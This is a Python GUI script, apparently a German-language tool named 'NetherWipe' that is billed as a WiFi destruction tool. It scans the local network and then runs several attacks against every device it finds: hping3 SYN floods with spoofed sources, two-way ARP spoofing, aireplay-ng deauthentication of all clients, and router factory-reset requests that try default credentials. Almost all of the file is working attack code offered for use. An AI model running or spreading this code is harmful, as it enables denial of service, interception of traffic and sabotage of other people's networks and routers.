#!/usr/bin/env python3
import subprocess
import sys
import threading
import time
import socket
import os
from tkinter import *
from tkinter import scrolledtext, messagebox
from scapy.all import ARP, Ether, srp, send

class NetherWipe:
    def __init__(self, root):
        self.root = root
        self.root.title("NetherWipe v1.0")
        self.root.geometry("600x500")
        self.root.configure(bg="#1e1e2e")

        Label(root, text="NetherWipe – WiFi Zerstörungstool", font=("Helvetica", 16, "bold"), bg="#1e1e2e", fg="#ff5555").pack(pady=10)

        frame = Frame(root, bg="#1e1e2e")
        frame.pack(pady=10)

        Label(frame, text="Router IP:", bg="#1e1e2e", fg="white", font=("Helvetica", 12)).grid(row=0, column=0, padx=5)
        self.ip_entry = Entry(frame, width=20, font=("Helvetica", 12))
        self.ip_entry.grid(row=0, column=1, padx=5)
        self.ip_entry.insert(0, "192.168.1.1")

        self.go_button = Button(root, text="🔥 ZERSTÖREN 🔥", command=self.start_attack, bg="#ff5555", fg="white", font=("Helvetica", 14, "bold"))
        self.go_button.pack(pady=20)

        self.log_area = scrolledtext.ScrolledText(root, width=70, height=20, bg="#2d2d3a", fg="#00ff99", font=("Courier", 10))
        self.log_area.pack(pady=10)

        self.log("NetherWipe gestartet. Bereit.")

    def log(self, msg):
        self.log_area.insert(END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
        self.log_area.see(END)
        self.root.update()

    def get_network_range(self, router_ip):
        parts = router_ip.split('.')
        return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"

    def arp_scan(self, network):
        arp = ARP(pdst=network)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        result = srp(packet, timeout=3, verbose=0)[0]
        devices = [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in result]
        return devices

    def dos_attack(self, target_ip):
        self.log(f"DoS auf {target_ip} gestartet")
        cmd = f"hping3 -S --flood --rand-source -p 80 {target_ip} -c 500000 &"
        subprocess.Popen(cmd, shell=True)
        time.sleep(30)
        subprocess.Popen("pkill hping3", shell=True)

    def arp_spoof(self, target_ip, router_ip):
        self.log(f"ARP-Spoofing gegen {target_ip}")
        subprocess.Popen(f"arpspoof -i en0 -t {target_ip} {router_ip} > /dev/null 2>&1 &", shell=True)
        subprocess.Popen(f"arpspoof -i en0 -t {router_ip} {target_ip} > /dev/null 2>&1 &", shell=True)

    def deauth_attack(self, router_mac, iface="en0"):
        self.log(f"Deauth-Angriff auf {router_mac} – trennt alle Clients")
        subprocess.Popen(f"aireplay-ng -0 0 -a {router_mac} {iface}", shell=True)

    def router_reset(self, router_ip):
        import requests
        from requests.auth import HTTPBasicAuth
        payloads = [f"http://{router_ip}/cgi-bin/reboot?factory=1",
                    f"http://{router_ip}/reset.htm",
                    f"http://{router_ip}/goform/reset"]
        defaults = [("admin","admin"), ("admin",""), ("root","admin"), ("user","user")]
        for url in payloads:
            for user, pw in defaults:
                try:
                    requests.get(url, auth=HTTPBasicAuth(user,pw), timeout=2)
                    self.log(f"Reset versucht: {url}")
                except:
                    pass

    def start_attack(self):
        router_ip = self.ip_entry.get().strip()
        if not router_ip:
            messagebox.showerror("Fehler", "Bitte Router IP eingeben")
            return
        self.go_button.config(state=DISABLED)
        self.log(f"Starte Zerstörung auf Router {router_ip}")
        network = self.get_network_range(router_ip)
        self.log(f"Scanne Netzwerk {network}")
        devices = self.arp_scan(network)
        self.log(f"Gefunden: {len(devices)} Geräte")
        for dev in devices:
            threading.Thread(target=self.dos_attack, args=(dev['ip'],)).start()
            threading.Thread(target=self.arp_spoof, args=(dev['ip'], router_ip)).start()
            time.sleep(0.5)
        threading.Thread(target=self.router_reset, args=(router_ip,)).start()

        # Versuche Deauth (Monitor Mode benötigt – finde Interface)
        try:
            iface = subprocess.getoutput("ifconfig | grep -E '^en[0-9]' | head -1 | cut -d: -f1").strip()
            router_mac = subprocess.getoutput(f"arp -n | grep {router_ip} | awk '{{print $3}}'")
            if router_mac and "ae" not in router_mac:
                threading.Thread(target=self.deauth_attack, args=(router_mac, iface)).start()
        except:
            self.log("Deauth nicht möglich – keine kompatible Karte im Monitor Mode")
        self.log("Alle Angriffe gestartet. Systeme werden jetzt zerstört.")

if __name__ == "__main__":
    root = Tk()
    app = NetherWipe(root)
    root.mainloop()